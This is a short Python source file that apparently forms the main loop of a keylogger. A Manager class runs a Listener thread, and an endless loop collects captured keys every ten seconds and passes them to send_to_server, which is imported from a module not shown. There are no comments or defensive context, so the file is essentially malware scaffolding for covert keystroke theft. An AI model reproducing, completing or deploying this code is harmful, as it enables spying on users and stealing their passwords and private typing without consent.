import threading
from time import sleep
from example_tools import send_to_server
from listener import Listener

class Manager:
    def __init__(self):
        self.listener = Listener()
        self.process = threading.Thread(target=self.listener.run)
    def start(self):
        self.process.start()
    def stop(self):
        self.listener.stop()


if __name__ == '__main__':

    p = Manager()
    p.start()
    while 1:
        sleep(10)
        t = p.listener.get_keys()
        send_to_server(t)